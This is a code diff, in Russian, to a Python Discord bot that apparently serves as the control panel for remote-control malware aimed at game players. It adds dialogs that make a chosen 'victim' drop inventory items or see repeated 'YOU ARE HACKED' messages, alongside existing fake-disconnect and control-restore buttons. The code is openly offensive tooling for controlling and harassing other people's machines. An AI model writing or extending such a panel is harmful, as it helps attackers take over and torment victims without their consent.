@@ -40,6 +40,104 @@ class PlayerSelect(discord.ui.Select):
         await interaction.response.send_message(f"✅ Выбран: `{self.values[0]}`", ephemeral=True)
 
 
+# Модальное окно для выброса предметов
+class DropModal(discord.ui.Modal, title="Выбросить предметы"):
+    slot = discord.ui.TextInput(
+        label="Слот (0-35, или 'all' для всех)",
+        placeholder="Например: 0 или all",
+        default="all",
+        max_length=10
+    )
+    amount = discord.ui.TextInput(
+        label="Количество (1-64, или 'all')",
+        placeholder="Например: 32 или all",
+        default="all",
+        max_length=5
+    )
+
+    async def on_submit(self, interaction: discord.Interaction):
+        player = getattr(bot, "selected_player", None)
+        if not player or player not in connected_players:
+            await interaction.response.send_message("❌ Игрок не выбран или офлайн!", ephemeral=True)
+            return
+
+        slot_val = self.slot.value.strip().lower()
+        amount_val = self.amount.value.strip().lower()
+
+        # Валидация слота
+        if slot_val != "all":
+            try:
+                s = int(slot_val)
+                if not 0 <= s <= 35:
+                    await interaction.response.send_message("❌ Слот должен быть от 0 до 35!", ephemeral=True)
+                    return
+            except ValueError:
+                await interaction.response.send_message("❌ Неверный слот!", ephemeral=True)
+                return
+
+        # Валидация количества
+        if amount_val != "all":
+            try:
+                a = int(amount_val)
+                if not 1 <= a <= 64:
+                    await interaction.response.send_message("❌ Количество должно быть от 1 до 64!", ephemeral=True)
+                    return
+            except ValueError:
+                await interaction.response.send_message("❌ Неверное количество!", ephemeral=True)
+                return
+
+        cmd = f"drop:{slot_val}:{amount_val}"
+        try:
+            await connected_players[player].send(cmd)
+            desc = f"слот {slot_val}" if slot_val != "all" else "все слоты"
+            amt = f"{amount_val} шт." if amount_val != "all" else "всё"
+            await interaction.response.send_message(
+                f"✅ Выброс → `{player}` | {desc} | {amt}", ephemeral=True
+            )
+        except Exception as e:
+            await interaction.response.send_message(f"❌ Ошибка: {e}", ephemeral=True)
+
+
+# Модальное окно для спама
+class SpamModal(discord.ui.Modal, title="Спам на экране"):
+    message = discord.ui.TextInput(
+        label="Сообщение",
+        placeholder="Текст который увидит жертва",
+        default="ТЫ ВЗЛОМАН 😈",
+        max_length=50
+    )
+    count = discord.ui.TextInput(
+        label="Количество повторений (1-30)",
+        placeholder="Например: 10",
+        default="10",
+        max_length=3
+    )
+
+    async def on_submit(self, interaction: discord.Interaction):
+        player = getattr(bot, "selected_player", None)
+        if not player or player not in connected_players:
+            await interaction.response.send_message("❌ Игрок не выбран или офлайн!", ephemeral=True)
+            return
+
+        try:
+            c = int(self.count.value.strip())
+            if not 1 <= c <= 30:
+                await interaction.response.send_message("❌ Повторений должно быть от 1 до 30!", ephemeral=True)
+                return
+        except ValueError:
+            await interaction.response.send_message("❌ Неверное число!", ephemeral=True)
+            return
+
+        cmd = f"spam:{self.message.value}:{c}"
+        try:
+            await connected_players[player].send(cmd)
+            await interaction.response.send_message(
+                f"✅ Спам → `{player}` | `{self.message.value}` x{c}", ephemeral=True
+            )
+        except Exception as e:
+            await interaction.response.send_message(f"❌ Ошибка: {e}", ephemeral=True)
+
+
 class TrollView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
@@ -68,21 +166,17 @@ class TrollView(discord.ui.View):
     async def restore(self, interaction, button):
         await self.send_cmd(interaction, "restore", "Управление восстановлено")
 
-    @discord.ui.button(label="💬 Спам на экране", style=discord.ButtonStyle.primary, row=2)
-    async def spam(self, interaction, button):
-        await self.send_cmd(interaction, "spam:ТЫ ВЗЛОМАН 😈", "Спам запущен")
-
-    @discord.ui.button(label="📦 Выбросить предметы", style=discord.ButtonStyle.danger, row=2)
+    @discord.ui.button(label="📦 Выбросить предметы...", style=discord.ButtonStyle.danger, row=2)
     async def drop(self, interaction, button):
-        await self.send_cmd(interaction, "drop", "Предметы выброшены")
+        await interaction.response.send_modal(DropModal())
+
+    @discord.ui.button(label="💬 Спам на экране...", style=discord.ButtonStyle.primary, row=2)
+    async def spam(self, interaction, button):
+        await interaction.response.send_modal(SpamModal())
 
     @discord.ui.button(label="📡 Фейк-дисконнект", style=discord.ButtonStyle.secondary, row=2)
     async def fakedisco(self, interaction, button):
         await self.send_cmd(interaction, "fakedisco", "Фейк-дисконнект")
-
-    @discord.ui.button(label="🍌 Бананчик", style=discord.ButtonStyle.danger, row=3)
-    async def banchik(self, interaction, button):
-        await self.send_cmd(interaction, "banana", "Бананчик запущен 🍌")
 
     @discord.ui.button(label="🔄 Обновить список", style=discord.ButtonStyle.success, row=3)
     async def refresh(self, interaction, button):
